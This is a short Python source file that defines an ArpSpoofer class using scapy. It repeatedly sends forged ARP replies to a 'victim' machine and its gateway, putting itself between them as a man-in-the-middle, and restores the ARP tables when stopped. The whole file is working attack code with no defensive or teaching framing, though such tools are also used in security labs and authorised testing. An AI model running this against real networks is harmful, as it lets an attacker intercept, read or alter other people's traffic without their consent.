from scapy.all import *
from scapy.layers.l2 import getmacbyip
import scapy.all as scapy
import time
from getmac import get_mac_address as gma


class ArpSpoofer:
    def __init__(self,targetIP, gatewayIP):
        self.destinationMac = getmacbyip(targetIP) #is Mac address of victim machine
        self.targetIP = targetIP #is Ip address of victim machine
        self.gatewayIP = gatewayIP #is gatewayIP
        self.sourceMAC = gma()
        self.on = True

    @staticmethod
    def get_mac(destinationIP, srcIP):
        p = sr1(scapy.ARP(op=scapy.ARP.who_has, psrc=srcIP, pdst=destinationIP))
        return p[scapy.hwsrc]

    def spoofer(self,targetIP, spoofIP):
        packet = scapy.ARP(op=2, pdst=targetIP, hwdst=scapy.getmacbyip(targetIP), psrc=spoofIP)
        scapy.send(packet, verbose=False)

    def restore(self, destinationIP, sourceIP):
        packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=scapy.getmacbyip(destinationIP), psrc=sourceIP,
                           hwsrc=scapy.getmacbyip(sourceIP))
        scapy.send(packet, count=4, verbose=False)

    def start(self):
        print("start arp spoofing")
        packets = 0
        while self.on:
            self.spoofer(self.targetIP, self.gatewayIP)
            self.spoofer(self.gatewayIP, self.targetIP)
            packets += 2
            time.sleep(1)

        self.restore(self.targetIP, self.gatewayIP)
        self.restore(self.gatewayIP, self.targetIP)
        print("stopped arp spoofing")


    def set_on(self, input):
        if input=='stop':
            self.on=False